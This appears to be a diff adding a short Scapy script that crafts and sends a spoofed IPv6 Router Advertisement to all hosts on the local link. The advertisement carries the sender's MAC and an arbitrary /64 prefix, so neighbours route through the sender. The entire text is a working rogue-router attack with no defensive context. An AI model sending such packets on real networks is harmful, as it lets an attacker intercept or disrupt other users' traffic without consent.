@@ -1,0 +1,23 @@
+----
+a = IPv6()
+a.dst = "ff02::1"       # This is the Multicast IPv6 address for All-Nodes
+
+b = ICMPv6ND_RA()
+
+c = ICMPv6NDOptSrcLLAddr()
+c.lladdr = "your MAC"    #This is to add to their ARP cache
+
+d = ICMPv6NDOptMTU()
+
+e = ICMPv6NDOptPrefixInfo()
+e.prefixlen= 64
+e.prefix= "2001:abcd:1234:abcd::"  # Can be any prefix that is not reserved already
+
+a.show()
+b.show()
+c.show()
+d.show()
+e.show()
+
+send(a/b/c/d/e)
+----
